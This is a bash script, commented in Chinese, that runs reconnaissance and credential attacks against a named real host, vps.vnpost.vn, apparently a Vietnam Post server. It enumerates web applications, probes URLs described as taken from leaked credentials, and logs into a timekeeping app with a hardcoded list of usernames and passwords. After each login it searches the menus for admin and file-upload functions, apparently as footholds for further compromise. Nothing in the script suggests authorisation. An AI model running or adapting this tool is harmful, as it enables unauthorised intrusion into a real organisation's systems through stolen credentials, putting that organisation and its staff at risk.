#!/bin/bash

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔍 认真侦察 - 找到真实可访问的系统"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

BASE="http://vps.vnpost.vn"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[1] 枚举所有可访问的Web应用"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

APPS=("chamcong" "vckv" "luong" "cos" "admin" "manage" "portal" "webmail" "api")

for app in "${APPS[@]}"; do
    echo -n "  /$app/: "
    resp=$(curl -sk "${BASE}/${app}/" -w "%{http_code}" -o /dev/null 2>&1)
    
    if [ "$resp" == "200" ]; then
        echo "✅ $resp (可访问)"
        
        # 获取标题
        title=$(curl -sk "${BASE}/${app}/" | grep -oE "<title>.*</title>" | sed 's/<[^>]*>//g')
        echo "      标题: $title"
        
    elif [ "$resp" == "302" ] || [ "$resp" == "301" ]; then
        echo "↗️  $resp (重定向)"
        
        # 跟踪重定向
        final=$(curl -sk "${BASE}/${app}/" -L -w "%{url_effective}" -o /dev/null 2>&1)
        echo "      →  $final"
        
    else
        echo "❌ $resp"
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[2] 测试泄露凭证的精确URL"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 从泄露凭证中提取的实际URL
echo "  A. http://vps.vnpost.vn/cos/SCRIPT/6_QUANTRI/change_password.asp"
resp_a=$(curl -sk "${BASE}/cos/SCRIPT/6_QUANTRI/change_password.asp" -w "%{http_code}" 2>&1)
echo "    状态: $(echo $resp_a | tail -c 4)"
echo "$resp_a" | head -20

echo ""
echo "  B. http://vps.vnpost.vn/cos/Login.asp"
resp_b=$(curl -sk "${BASE}/cos/Login.asp" -w "%{http_code}" 2>&1)
echo "    状态: $(echo $resp_b | tail -c 4)"
if echo "$resp_b" | grep -qi "login\|username\|password"; then
    echo "    ✅ 是登录页面"
fi

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[3] 从根目录爬取所有应用"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "  获取首页..."
curl -sk "${BASE}/" -o homepage.html 2>&1

# 提取所有href
grep -hoE 'href="[^"]+' homepage.html | cut -d'"' -f2 | grep -E "^/[a-zA-Z]" | cut -d'/' -f2 | sort -u

echo ""
echo "  发现的目录:"
grep -hoE 'href="/[^/"]+' homepage.html | cut -d'"' -f2 | sort -u

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[4] 测试Chamcong其他账号（寻找管理员）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

CHAMCONG_ACCOUNTS=(
    "KVMBTCKT:123"
    "KVMTBDVP:123"
    "KVMTNVKS:123"
    "KVMTVCGN:234"
)

for account in "${CHAMCONG_ACCOUNTS[@]}"; do
    IFS=':' read user pass <<< "$account"
    echo ""
    echo "  测试: $user:$pass"
    
    # 获取登录页
    page=$(curl -sk "${BASE}/chamcong/login.aspx" 2>&1)
    VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
    VG=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
    EV=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)
    
    # 登录
    resp=$(curl -sk "${BASE}/chamcong/login.aspx" \
        -X POST \
        -c "cookie_${user}.txt" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "tUser=$user" \
        --data-urlencode "tPass=$pass" \
        --data-urlencode "tOk=Đăng nhập" \
        -L 2>&1)
    
    # 检查登录
    if echo "$resp" | grep -qi "top.aspx\|leftmenu\|logout"; then
        echo "    ✅ 登录成功！"
        
        # 获取菜单
        menu=$(curl -sk "${BASE}/chamcong/leftmenu.aspx" -b "cookie_${user}.txt" 2>&1)
        
        # 检查是否有管理员功能
        if echo "$menu" | grep -qi "admin\|user.*manage\|system\|config"; then
            echo "    🔥🔥🔥 可能是管理员账号！"
        fi
        
        # 提取功能
        echo "$menu" | grep -hoE 'href="[^"]+\.aspx[^"]*"' | sed 's/href="//g' | sed 's/"//g' | sort -u > "menu_${user}.txt"
        echo "    功能数: $(wc -l < menu_${user}.txt)"
        
        # 寻找上传功能
        if grep -qi "upload\|import\|file" "menu_${user}.txt"; then
            echo "    🔥🔥🔥 发现上传/导入功能！"
            grep -i "upload\|import\|file" "menu_${user}.txt"
        fi
        
    else
        echo "    ❌ 登录失败"
    fi
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 认真侦察完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
